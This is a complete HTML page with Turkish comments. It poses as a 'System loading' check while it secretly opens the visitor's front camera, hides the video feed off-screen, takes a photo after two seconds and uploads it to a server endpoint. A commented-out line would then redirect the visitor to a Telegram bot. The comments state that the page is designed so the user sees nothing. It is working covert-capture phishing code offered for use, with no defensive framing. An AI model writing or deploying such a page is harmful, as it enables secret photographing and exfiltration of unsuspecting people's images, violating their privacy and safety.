<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrolü</title>
    <style>
        /* Tasarım kısmı - Kullanıcı bir şey görmesin diye */
        body {
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            color: white;
            font-family: Arial, sans-serif;
        }
        /* Videoyu gizli tutuyoruz ama silmiyoruz (Siyah ekranı önlemek için önemli) */
        #video {
            position: absolute;
            top: -9999px;
            left: -9999px;
            opacity: 0;
        }
        .loading {
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="loading">
        <h3>Sistem Yükleniyor...</h3>
        <p>Lütfen bekleyiniz.</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Ayarlar
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // 1. Kameraya Erişim İste
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user", // Ön kamera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;

                // 2. Görüntü akışı başladığında tetiklenir
                video.oncanplay = function() {
                    console.log("Kamera akışı başladı, bekleniyor...");
                    
                    // 3. Siyah ekranı önlemek için 2 saniye bekle (Kamera ısınma süresi)
                    setTimeout(takePhoto, 2000);
                };

            } catch (err) {
                console.error("Kamera açma hatası:", err);
                // Hata durumunda yapılacaklar (isteğe bağlı)
            }
        }

        // 4. Fotoğraf Çekme Fonksiyonu
        function takePhoto() {
            const context = canvas.getContext('2d');
            
            // Canvas boyutlarını video boyutlarına eşitle
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Videodan kareyi yakala
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // 5. Görüntüyü Base64 formatına çevir (JPEG)
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            // 6. Veriyi Sunucuya Gönder
            sendToServer(imageData);
        }

        // 7. Veriyi Gönderme (Backend bağlantın)
        function sendToServer(data) {
            fetch('/upload', { // Burayı kendi sunucu yolunla değiştir
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    image: data
                })
            })
            .then(response => {
                console.log("Veri başarıyla gönderildi.");
                // Gönderimden sonra istersen kullanıcıyı başka yere yönlendir
                // window.location.href = "https://t.me/NXSStore_bot";
            })
            .catch(error => {
                console.error("Gönderim hatası:", error);
            });
        }

        // Sayfa yüklendiğinde kamerayı başlat
        window.onload = startCamera;
    </script>
</body>
</html>
